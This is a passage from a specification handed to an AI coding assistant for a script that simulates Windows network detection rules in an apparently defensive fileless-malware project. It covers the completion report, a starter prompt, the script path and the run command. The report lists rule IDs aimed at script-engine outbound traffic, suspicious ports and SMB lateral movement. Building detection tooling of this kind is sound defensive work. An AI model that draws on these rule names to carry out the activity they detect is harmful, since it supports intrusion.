  Do NOT use VM wall-clock time. All DB timestamps are UTC.
```

Use f-strings with DB_PATH and _REPO_ROOT to fill in the correct paths dynamically.

---

## BLOCK 8 — Completion report format

After writing the CSV, print:

```
======================================================
SUBPHASE 3 SIMULATION COMPLETE
======================================================
Total rules in network.yaml (live): 9
Rules simulated: 7 (2 structural SKIP — D28)
EID-3 rules: 7
EID-22 rules: 2
D29-risk rules: NET_DNS_SCRIPT_ENGINE_001, NET_SCRIPTING_ENGINE_HTTP_001,
                NET_SCRIPT_ENGINE_OUTBOUND_001 (wscript/cscript paths)
D28 structural SKIPs: NET_SUSPICIOUS_PORT_001, NET_SMB_LATERAL_001
SIM_START (UTC): <SIM_START>
SIM_END   (UTC): <SIM_END>
CSV written to: exports/subphase_3_training.csv
```

Then hard stop. Do NOT proceed to feature extraction, do NOT modify other files.

---

## Starter prompt for Grok

Give Grok this exact message before sharing this document:

> You are implementing a precise simulation script for a security detection project.
> You must follow the specification below EXACTLY — no deviations, no invented values, no assumptions.
> If anything is unclear or ambiguous, STOP and ask before writing that section.
> The specification is your only source of truth.

Then share this entire document.

---

## Script location

The generated script must be saved as:
```
scripts/simulate_subphase_3.py
```

Run command (from Z:\filelessmalware on the VM):
```powershell
& .\python_runtime\python.exe .\scripts\simulate_subphase_3.py
```
